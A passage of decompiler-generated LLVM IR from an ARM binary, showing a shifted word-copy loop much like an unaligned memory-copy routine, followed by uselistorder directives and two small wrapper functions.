  %v2_1278c62 = phi i32 [ %v5_1283c, %dec_label_pc_12848.loopexit ], [ %v1_12818, %dec_label_pc_12824 ]
  %v0_1277c58 = phi i32 [ %v2_12840, %dec_label_pc_12848.loopexit ], [ %v2_12828, %dec_label_pc_12824 ]
  %v0_12848 = load i32, i32* %r1.global-to-local, align 4
  %v1_12848 = add i32 %v0_12848, 3
  store i32 %v1_12848, i32* @r1, align 4
  br label %bb142

dec_label_pc_12850:                               ; preds = %dec_label_pc_127e0
  br i1 %v5_128c0, label %dec_label_pc_1289c, label %dec_label_pc_12858

dec_label_pc_12858:                               ; preds = %dec_label_pc_12850
  store i32 %v2_128bc, i32* %r2.global-to-local, align 4
  %v3_1285c = load i32, i32* @r4, align 4
  store i32 %v3_1285c, i32* %stack_var_-12, align 4
  %v6_1285c = load i32, i32* @r5, align 4
  %v8_1285c = inttoptr i32 %v6_1285c to i8*
  store i8* %v8_1285c, i8** %stack_var_-8, align 4
  %v11_1285c = load i32, i32* @lr, align 4
  br label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %dec_label_pc_12860.dec_label_pc_12860_crit_edge, %dec_label_pc_12858
  %v0_12884 = phi i32 [ %v1_12884, %dec_label_pc_12860.dec_label_pc_12860_crit_edge ], [ %v0_1281830, %dec_label_pc_12858 ]
  %v0_12864 = phi i32 [ %v0_12864.pre, %dec_label_pc_12860.dec_label_pc_12860_crit_edge ], [ %v1_127d0, %dec_label_pc_12858 ]
  %v0_12860 = phi i32 [ %v0_12860.pre, %dec_label_pc_12860.dec_label_pc_12860_crit_edge ], [ %v2_127d4, %dec_label_pc_12858 ]
  %v3_12860 = mul i32 %v0_12860, 65536
  store i32 %v3_12860, i32* %lr.global-to-local, align 4
  %v1_12864 = add i32 %v0_12864, -4
  %v2_12864 = inttoptr i32 %v1_12864 to i32*
  %v3_12864 = load i32, i32* %v2_12864, align 4
  store i32 %v3_12864, i32* %r3.global-to-local, align 4
  %v4_12864 = add i32 %v0_12864, -8
  %v5_12864 = inttoptr i32 %v4_12864 to i32*
  %v6_12864 = load i32, i32* %v5_12864, align 4
  store i32 %v6_12864, i32* %r4.global-to-local, align 4
  %v7_12864 = add i32 %v0_12864, -12
  %v8_12864 = inttoptr i32 %v7_12864 to i32*
  %v9_12864 = load i32, i32* %v8_12864, align 4
  store i32 %v9_12864, i32* %r5.global-to-local, align 4
  %v10_12864 = add i32 %v0_12864, -16
  %v11_12864 = inttoptr i32 %v10_12864 to i32*
  %v12_12864 = load i32, i32* %v11_12864, align 4
  store i32 %v10_12864, i32* %r1.global-to-local, align 4
  %v4_12868 = udiv i32 %v12_12864, 65536
  %v5_12868 = or i32 %v4_12868, %v3_12860
  store i32 %v5_12868, i32* %lr.global-to-local, align 4
  %v3_1286c = mul i32 %v12_12864, 65536
  %v4_12870 = udiv i32 %v9_12864, 65536
  %v5_12870 = or i32 %v3_1286c, %v4_12870
  store i32 %v5_12870, i32* @ip, align 4
  %v3_12874 = mul i32 %v9_12864, 65536
  %v4_12878 = udiv i32 %v6_12864, 65536
  %v5_12878 = or i32 %v3_12874, %v4_12878
  store i32 %v5_12878, i32* %r5.global-to-local, align 4
  %v3_1287c = mul i32 %v6_12864, 65536
  %v4_12880 = udiv i32 %v3_12864, 65536
  %v5_12880 = or i32 %v3_1287c, %v4_12880
  store i32 %v5_12880, i32* %r4.global-to-local, align 4
  %v1_12884 = add i32 %v0_12884, -16
  %v2_12884 = inttoptr i32 %v1_12884 to i32*
  store i32 %v5_12880, i32* %v2_12884, align 4
  %v4_12884 = add i32 %v0_12884, -12
  %v5_12884 = inttoptr i32 %v4_12884 to i32*
  %v6_12884 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12884, i32* %v5_12884, align 4
  %v7_12884 = add i32 %v0_12884, -8
  %v8_12884 = inttoptr i32 %v7_12884 to i32*
  %v9_12884 = load i32, i32* @ip, align 4
  store i32 %v9_12884, i32* %v8_12884, align 4
  %v10_12884 = add i32 %v0_12884, -4
  %v11_12884 = inttoptr i32 %v10_12884 to i32*
  %v12_12884 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12884, i32* %v11_12884, align 4
  store i32 %v1_12884, i32* %r0.global-to-local, align 4
  %v0_12888 = load i32, i32* %r2.global-to-local, align 4
  %v2_12888 = add i32 %v0_12888, -16
  store i32 %v2_12888, i32* %r2.global-to-local, align 4
  %v6_1288c = icmp slt i32 %v0_12888, 16
  br i1 %v6_1288c, label %dec_label_pc_12890, label %dec_label_pc_12860.dec_label_pc_12860_crit_edge

dec_label_pc_12860.dec_label_pc_12860_crit_edge:  ; preds = %dec_label_pc_12860
  %v0_12860.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_12864.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12860

dec_label_pc_12890:                               ; preds = %dec_label_pc_12860
  %v2_12890 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12890, i32* @r4, align 4
  %v5_12890 = load i8*, i8** %stack_var_-8, align 4
  %v6_12890 = ptrtoint i8* %v5_12890 to i32
  store i32 %v6_12890, i32* @r5, align 4
  store i32 %v11_1285c, i32* @lr, align 4
  %v2_12894 = add i32 %v0_12888, -4
  store i32 %v2_12894, i32* %r2.global-to-local, align 4
  %v4_12894 = add i32 %v0_12888, 2147483632
  %v5_12894 = and i32 %v2_12894, %v4_12894
  %v6_12894 = icmp slt i32 %v5_12894, 0
  store i1 %v6_12894, i1* %cpsr_v.global-to-local, align 1
  %v7_12894 = icmp slt i32 %v2_12894, 0
  store i1 %v7_12894, i1* %cpsr_n.global-to-local, align 1
  %v5_12898 = icmp slt i32 %v2_12888, -12
  br i1 %v5_12898, label %dec_label_pc_128b4, label %dec_label_pc_1289c

dec_label_pc_1289c:                               ; preds = %dec_label_pc_12890, %dec_label_pc_12850, %dec_label_pc_1289c
  %v1_128a8 = phi i32 [ %v5_128a8, %dec_label_pc_1289c ], [ %v1_12884, %dec_label_pc_12890 ], [ %v0_1281830, %dec_label_pc_12850 ]
  %v0_1289c = load i32, i32* %r3.global-to-local, align 4
  %v3_1289c = mul i32 %v0_1289c, 65536
  store i32 %v3_1289c, i32* %ip.global-to-local, align 4
  %v0_128a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_128a0 = add i32 %v0_128a0, -4
  %v2_128a0 = inttoptr i32 %v1_128a0 to i32*
  %v3_128a0 = load i32, i32* %v2_128a0, align 4
  store i32 %v3_128a0, i32* %r3.global-to-local, align 4
  store i32 %v1_128a0, i32* %r1.global-to-local, align 4
  %v4_128a4 = udiv i32 %v3_128a0, 65536
  %v5_128a4 = or i32 %v4_128a4, %v3_1289c
  store i32 %v5_128a4, i32* @ip, align 4
  %v2_128a8 = add i32 %v1_128a8, -4
  %v3_128a8 = inttoptr i32 %v2_128a8 to i32*
  store i32 %v5_128a4, i32* %v3_128a8, align 4
  %v4_128a8 = load i32, i32* %r0.global-to-local, align 4
  %v5_128a8 = add i32 %v4_128a8, -4
  store i32 %v5_128a8, i32* %r0.global-to-local, align 4
  %v0_128ac = load i32, i32* %r2.global-to-local, align 4
  %v2_128ac = add i32 %v0_128ac, -4
  store i32 %v2_128ac, i32* %r2.global-to-local, align 4
  %v6_128b0 = icmp slt i32 %v0_128ac, 4
  br i1 %v6_128b0, label %dec_label_pc_128b4.loopexit, label %dec_label_pc_1289c

dec_label_pc_128b4.loopexit:                      ; preds = %dec_label_pc_1289c
  %v4_128ac = sub i32 3, %v0_128ac
  %v5_128ac = and i32 %v4_128ac, %v0_128ac
  %v6_128ac = icmp slt i32 %v5_128ac, 0
  %v7_128ac = icmp slt i32 %v2_128ac, 0
  store i1 %v6_128ac, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_128ac, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_128b4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_128b4.loopexit, %dec_label_pc_12890
  %v2_1278c63 = phi i32 [ %v5_128a8, %dec_label_pc_128b4.loopexit ], [ %v1_12884, %dec_label_pc_12890 ]
  %v0_1277c59 = phi i32 [ %v2_128ac, %dec_label_pc_128b4.loopexit ], [ %v2_12894, %dec_label_pc_12890 ]
  %v0_128b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_128b4 = add i32 %v0_128b4, 2
  store i32 %v1_128b4, i32* @r1, align 4
  br label %bb142

dec_label_pc_128bc:                               ; preds = %dec_label_pc_127d0
  br i1 %v5_128c0, label %dec_label_pc_12908, label %dec_label_pc_128c4

dec_label_pc_128c4:                               ; preds = %dec_label_pc_128bc
  store i32 %v2_128bc, i32* %r2.global-to-local, align 4
  %v3_128c8 = load i32, i32* @r4, align 4
  store i32 %v3_128c8, i32* %stack_var_-12, align 4
  %v6_128c8 = load i32, i32* @r5, align 4
  %v8_128c8 = inttoptr i32 %v6_128c8 to i8*
  store i8* %v8_128c8, i8** %stack_var_-8, align 4
  %v11_128c8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_128cc

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128cc.dec_label_pc_128cc_crit_edge, %dec_label_pc_128c4
  %v0_128f0 = phi i32 [ %v1_128f0, %dec_label_pc_128cc.dec_label_pc_128cc_crit_edge ], [ %v0_1281830, %dec_label_pc_128c4 ]
  %v0_128d0 = phi i32 [ %v0_128d0.pre, %dec_label_pc_128cc.dec_label_pc_128cc_crit_edge ], [ %v1_127d0, %dec_label_pc_128c4 ]
  %v0_128cc = phi i32 [ %v0_128cc.pre, %dec_label_pc_128cc.dec_label_pc_128cc_crit_edge ], [ %v2_127d4, %dec_label_pc_128c4 ]
  %v3_128cc = mul i32 %v0_128cc, 16777216
  store i32 %v3_128cc, i32* %lr.global-to-local, align 4
  %v1_128d0 = add i32 %v0_128d0, -4
  %v2_128d0 = inttoptr i32 %v1_128d0 to i32*
  %v3_128d0 = load i32, i32* %v2_128d0, align 4
  store i32 %v3_128d0, i32* %r3.global-to-local, align 4
  %v4_128d0 = add i32 %v0_128d0, -8
  %v5_128d0 = inttoptr i32 %v4_128d0 to i32*
  %v6_128d0 = load i32, i32* %v5_128d0, align 4
  store i32 %v6_128d0, i32* %r4.global-to-local, align 4
  %v7_128d0 = add i32 %v0_128d0, -12
  %v8_128d0 = inttoptr i32 %v7_128d0 to i32*
  %v9_128d0 = load i32, i32* %v8_128d0, align 4
  store i32 %v9_128d0, i32* %r5.global-to-local, align 4
  %v10_128d0 = add i32 %v0_128d0, -16
  %v11_128d0 = inttoptr i32 %v10_128d0 to i32*
  %v12_128d0 = load i32, i32* %v11_128d0, align 4
  store i32 %v10_128d0, i32* %r1.global-to-local, align 4
  %v4_128d4 = udiv i32 %v12_128d0, 256
  %v5_128d4 = or i32 %v4_128d4, %v3_128cc
  store i32 %v5_128d4, i32* %lr.global-to-local, align 4
  %v3_128d8 = mul i32 %v12_128d0, 16777216
  %v4_128dc = udiv i32 %v9_128d0, 256
  %v5_128dc = or i32 %v3_128d8, %v4_128dc
  store i32 %v5_128dc, i32* @ip, align 4
  %v3_128e0 = mul i32 %v9_128d0, 16777216
  %v4_128e4 = udiv i32 %v6_128d0, 256
  %v5_128e4 = or i32 %v3_128e0, %v4_128e4
  store i32 %v5_128e4, i32* %r5.global-to-local, align 4
  %v3_128e8 = mul i32 %v6_128d0, 16777216
  %v4_128ec = udiv i32 %v3_128d0, 256
  %v5_128ec = or i32 %v3_128e8, %v4_128ec
  store i32 %v5_128ec, i32* %r4.global-to-local, align 4
  %v1_128f0 = add i32 %v0_128f0, -16
  %v2_128f0 = inttoptr i32 %v1_128f0 to i32*
  store i32 %v5_128ec, i32* %v2_128f0, align 4
  %v4_128f0 = add i32 %v0_128f0, -12
  %v5_128f0 = inttoptr i32 %v4_128f0 to i32*
  %v6_128f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_128f0, i32* %v5_128f0, align 4
  %v7_128f0 = add i32 %v0_128f0, -8
  %v8_128f0 = inttoptr i32 %v7_128f0 to i32*
  %v9_128f0 = load i32, i32* @ip, align 4
  store i32 %v9_128f0, i32* %v8_128f0, align 4
  %v10_128f0 = add i32 %v0_128f0, -4
  %v11_128f0 = inttoptr i32 %v10_128f0 to i32*
  %v12_128f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_128f0, i32* %v11_128f0, align 4
  store i32 %v1_128f0, i32* %r0.global-to-local, align 4
  %v0_128f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_128f4 = add i32 %v0_128f4, -16
  store i32 %v2_128f4, i32* %r2.global-to-local, align 4
  %v6_128f8 = icmp slt i32 %v0_128f4, 16
  br i1 %v6_128f8, label %dec_label_pc_128fc, label %dec_label_pc_128cc.dec_label_pc_128cc_crit_edge

dec_label_pc_128cc.dec_label_pc_128cc_crit_edge:  ; preds = %dec_label_pc_128cc
  %v0_128cc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_128d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_128cc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128cc
  %v2_128fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_128fc, i32* @r4, align 4
  %v5_128fc = load i8*, i8** %stack_var_-8, align 4
  %v6_128fc = ptrtoint i8* %v5_128fc to i32
  store i32 %v6_128fc, i32* @r5, align 4
  store i32 %v11_128c8, i32* @lr, align 4
  %v2_12900 = add i32 %v0_128f4, -4
  store i32 %v2_12900, i32* %r2.global-to-local, align 4
  %v4_12900 = add i32 %v0_128f4, 2147483632
  %v5_12900 = and i32 %v2_12900, %v4_12900
  %v6_12900 = icmp slt i32 %v5_12900, 0
  store i1 %v6_12900, i1* %cpsr_v.global-to-local, align 1
  %v7_12900 = icmp slt i32 %v2_12900, 0
  store i1 %v7_12900, i1* %cpsr_n.global-to-local, align 1
  %v5_12904 = icmp slt i32 %v2_128f4, -12
  br i1 %v5_12904, label %dec_label_pc_12920, label %dec_label_pc_12908

dec_label_pc_12908:                               ; preds = %dec_label_pc_128fc, %dec_label_pc_128bc, %dec_label_pc_12908
  %v1_12914 = phi i32 [ %v5_12914, %dec_label_pc_12908 ], [ %v1_128f0, %dec_label_pc_128fc ], [ %v0_1281830, %dec_label_pc_128bc ]
  %v0_12908 = load i32, i32* %r3.global-to-local, align 4
  %v3_12908 = mul i32 %v0_12908, 16777216
  store i32 %v3_12908, i32* %ip.global-to-local, align 4
  %v0_1290c = load i32, i32* %r1.global-to-local, align 4
  %v1_1290c = add i32 %v0_1290c, -4
  %v2_1290c = inttoptr i32 %v1_1290c to i32*
  %v3_1290c = load i32, i32* %v2_1290c, align 4
  store i32 %v3_1290c, i32* %r3.global-to-local, align 4
  store i32 %v1_1290c, i32* %r1.global-to-local, align 4
  %v4_12910 = udiv i32 %v3_1290c, 256
  %v5_12910 = or i32 %v4_12910, %v3_12908
  store i32 %v5_12910, i32* @ip, align 4
  %v2_12914 = add i32 %v1_12914, -4
  %v3_12914 = inttoptr i32 %v2_12914 to i32*
  store i32 %v5_12910, i32* %v3_12914, align 4
  %v4_12914 = load i32, i32* %r0.global-to-local, align 4
  %v5_12914 = add i32 %v4_12914, -4
  store i32 %v5_12914, i32* %r0.global-to-local, align 4
  %v0_12918 = load i32, i32* %r2.global-to-local, align 4
  %v2_12918 = add i32 %v0_12918, -4
  store i32 %v2_12918, i32* %r2.global-to-local, align 4
  %v6_1291c = icmp slt i32 %v0_12918, 4
  br i1 %v6_1291c, label %dec_label_pc_12920.loopexit, label %dec_label_pc_12908

dec_label_pc_12920.loopexit:                      ; preds = %dec_label_pc_12908
  %v4_12918 = sub i32 3, %v0_12918
  %v5_12918 = and i32 %v4_12918, %v0_12918
  %v6_12918 = icmp slt i32 %v5_12918, 0
  %v7_12918 = icmp slt i32 %v2_12918, 0
  store i1 %v6_12918, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12918, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12920

dec_label_pc_12920:                               ; preds = %dec_label_pc_12920.loopexit, %dec_label_pc_128fc
  %v2_1278c64 = phi i32 [ %v5_12914, %dec_label_pc_12920.loopexit ], [ %v1_128f0, %dec_label_pc_128fc ]
  %v0_1277c60 = phi i32 [ %v2_12918, %dec_label_pc_12920.loopexit ], [ %v2_12900, %dec_label_pc_128fc ]
  %v0_12920 = load i32, i32* %r1.global-to-local, align 4
  %v1_12920 = add i32 %v0_12920, 1
  store i32 %v1_12920, i32* @r1, align 4
  br label %bb142

; uselistorder directives
  uselistorder i32 %v5_12914, { 0, 2, 1 }
  uselistorder i32 %v3_12908, { 1, 0 }
  uselistorder i32 %v2_12900, { 0, 2, 1, 3 }
  uselistorder i32 %v1_128f0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_128d0, { 1, 0 }
  uselistorder i32 %v3_128cc, { 1, 0 }
  uselistorder i32 %v0_128d0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_128f0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_128a8, { 0, 2, 1 }
  uselistorder i32 %v3_1289c, { 1, 0 }
  uselistorder i32 %v2_12894, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12884, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_12864, { 1, 0 }
  uselistorder i32 %v3_12860, { 1, 0 }
  uselistorder i32 %v0_12864, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12884, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1283c, { 0, 2, 1 }
  uselistorder i32 %v3_12830, { 1, 0 }
  uselistorder i32 %v2_12828, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12818, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_127f8, { 1, 0 }
  uselistorder i32 %v3_127f4, { 1, 0 }
  uselistorder i32 %v0_127f8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12818, { 3, 2, 1, 0 }
  uselistorder i1 %v5_128c0, { 2, 0, 1 }
  uselistorder i32 %v0_127d8, { 1, 0 }
  uselistorder i32 %v0_128c4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1281830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_127c8, { 2, 1, 0 }
  uselistorder i32 %v0_127c8, { 2, 0, 1 }
  uselistorder i32 %v2_127c0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_127c0, { 1, 0, 2 }
  uselistorder i32 %v0_127c0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1281831, { 2, 1, 0 }
  uselistorder i32 %v11_1279c, { 1, 0 }
  uselistorder i32 %v7_1279c, { 1, 0 }
  uselistorder i32 %v1_1277c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1277c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12780, { 1, 0 }
  uselistorder i32 %v7_12774, { 0, 2, 1 }
  uselistorder i32 %v10_12770, { 1, 0 }
  uselistorder i32 %v9_12768, { 1, 0, 2 }
  uselistorder i32 %v6_12764, { 1, 0 }
  uselistorder i32 %v2_1275c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1275c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1276c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_12750, { 0, 2, 1 }
  uselistorder i32 %v13_1274c, { 1, 0 }
  uselistorder i32 %v4_12748, { 0, 2, 1, 3 }
  uselistorder i32 %v0_12748, { 2, 0, 1 }
  uselistorder i32 %v6_12750, { 0, 3, 2, 1 }
  uselistorder i32 %v7_12740, { 0, 2, 1 }
  uselistorder i32 %v16_1273c, { 1, 0 }
  uselistorder i32 %v4_12738, { 1, 0 }
  uselistorder i32 %v0_12748.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_12740, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1272c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_12728, { 1, 0 }
  uselistorder i32 %v1_12724, { 1, 0 }
  uselistorder i32 %v10_12720, { 1, 0 }
  uselistorder i32 %v0_12720, { 3, 2, 1, 0 }
  uselistorder i32 %v0_12724, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_12718, { 0, 2, 1 }
  uselistorder i32 %v2_1270c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1270c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1272448, { 1, 2, 0 }
  uselistorder i32 %v1_12704, { 2, 1, 0 }
  uselistorder i32 %v1_126fc, { 2, 3, 1, 0 }
  uselistorder i32 %v2_126f4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_126f0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_126ec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_126ec, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_126d8, { 0, 2, 1 }
  uselistorder i32 %v3_126cc, { 1, 0 }
  uselistorder i32 %v2_126c4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_126b4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_12694, { 1, 0, 2 }
  uselistorder i32 %v5_12694, { 1, 0, 2 }
  uselistorder i32 %v2_12694, { 1, 0, 2 }
  uselistorder i32 %v3_12690, { 1, 0 }
  uselistorder i32 %v0_12694, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_126b4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1266c, { 0, 2, 1 }
  uselistorder i32 %v3_12660, { 1, 0 }
  uselistorder i32 %v2_12658, { 0, 2, 1, 3 }
  uselistorder i32 %v12_12648, { 1, 0, 3, 2 }
  uselistorder i32 %v8_12628, { 1, 0, 2 }
  uselistorder i32 %v5_12628, { 1, 0, 2 }
  uselistorder i32 %v2_12628, { 1, 0, 2 }
  uselistorder i32 %v3_12624, { 1, 0 }
  uselistorder i32 %v0_12628, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12648, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_12600, { 0, 2, 1 }
  uselistorder i32 %v3_125f4, { 1, 0 }
  uselistorder i32 %v2_125ec, { 0, 2, 1, 3 }
  uselistorder i32 %v12_125dc, { 1, 0, 3, 2 }
  uselistorder i32 %v8_125bc, { 1, 0, 2 }
  uselistorder i32 %v5_125bc, { 1, 0, 2 }
  uselistorder i32 %v2_125bc, { 1, 0, 2 }
  uselistorder i32 %v3_125b8, { 1, 0 }
  uselistorder i32 %v0_125bc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_125dc, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_12684, { 2, 0, 1 }
  uselistorder i32 %v0_12688, { 3, 0, 2, 1 }
  uselistorder i32 %v0_125dc74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1258c, { 1, 0 }
  uselistorder i32 %v0_1258c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_12584, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_12584, { 1, 0, 2 }
  uselistorder i32 %v0_12584, { 2, 0, 1, 3 }
  uselistorder i32 %v0_125dc75, { 2, 1, 0 }
  uselistorder i32 %v1_12564, { 1, 0, 2 }
  uselistorder i32 %v1_1253c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1253c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_12528, { 1, 0, 2 }
  uselistorder i32 %v6_12524, { 1, 0 }
  uselistorder i32 %v2_1251c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1251c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1252c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_12514, { 0, 2, 1 }
  uselistorder i1 %v0_12514, { 1, 0 }
  uselistorder i1 %v1_12514, { 1, 0 }
  uselistorder i32 %v3_12510, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_12508, { 0, 2, 1, 3 }
  uselistorder i32 %v4_124f4, { 1, 0 }
  uselistorder i32 %v12_124e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_124dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_124e0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_124d0, { 0, 2, 1 }
  uselistorder i32 %v2_124c8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_124c8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_124c0, { 1, 0 }
  uselistorder i32 %v1_124b8, { 2, 1, 0 }
  uselistorder i32 %v2_124b0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_124b0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_124a0, { 1, 0 }
  uselistorder i32 %v1_124a0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_124a0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 60, 1, 2, 3, 4, 5, 61, 6, 7, 8, 9, 10, 62, 11, 12, 13, 14, 15, 63, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 64, 65, 66, 67, 69, 68, 30, 31, 56, 32, 33, 34, 35, 36, 57, 37, 38, 39, 40, 41, 58, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 35, 36, 34, 18, 19, 22, 20, 28, 21, 23, 26, 24, 29, 25, 27, 30, 31, 32, 33 }
  uselistorder i32* %r0.global-to-local, { 3, 50, 4, 5, 51, 6, 7, 52, 8, 9, 10, 11, 12, 13, 53, 14, 16, 15, 17, 18, 54, 19, 20, 55, 21, 22, 23, 24, 56, 57, 59, 60, 25, 32, 26, 27, 33, 28, 29, 30, 31, 34, 35, 0, 36, 37, 39, 38, 40, 41, 58, 42, 43, 44, 47, 45, 46, 48, 49, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_v.global-to-local, { 40, 4, 41, 6, 42, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18, 19, 38, 2, 39, 0, 21, 1, 22, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_n.global-to-local, { 46, 4, 47, 6, 48, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 42, 43, 44, 2, 45, 0, 22, 1, 23, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12908, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1289c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12830, { 2, 0, 1 }
  uselistorder label %dec_label_pc_127d0, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb142, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1275c, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_12720, { 1, 0 }
  uselistorder label %dec_label_pc_1270c, { 1, 0 }
  uselistorder label %dec_label_pc_126cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12660, { 2, 0, 1 }
  uselistorder label %dec_label_pc_125f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12594, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb132, { 6, 4, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_12508, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_124c8, { 1, 0 }
}

define i32 @function_12928(i32 %arg1) local_unnamed_addr {
dec_label_pc_12928:
  ret i32 %arg1
}

define i32 @function_12930(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12930:
  %v0_12930 = load i32, i32* @r0, align 4
  %v1_12930 = load i32, i32* @r1, align 4
  %v2_12930 = inttoptr i32 %v0_12930 to i8*
  %v3_12930 = call i32 @function_124a0(i8* %v2_12930, i32 %v1_12930)
  ret i32 %v3_12930

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_124a0, { 1, 2, 0 }
}

